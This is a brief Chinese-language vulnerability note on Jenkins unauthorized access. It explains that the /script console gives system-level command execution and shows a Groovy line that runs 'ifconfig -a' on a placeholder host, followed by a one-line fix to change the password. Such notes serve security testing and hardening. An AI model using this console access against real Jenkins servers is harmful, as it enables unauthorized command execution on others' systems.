### 一 漏洞描述
Jenkins未授权访问

默认情况下 Jenkins 面板中用户可以选择执行脚本界面来操作一些系统层命令，攻击者可通过未授权访问漏洞或者暴力破解用户密码等，进脚本执行界面从而获取服务器权限。

### 二 漏洞利用
脚本执行界面 执行脚本、获取服务器权限  

http://xx.xx.xx.xx:8080/script  
执行: println "ifconfig -a".execute().text  
![img.png](img.png)

### 三 漏洞修复
修改口令

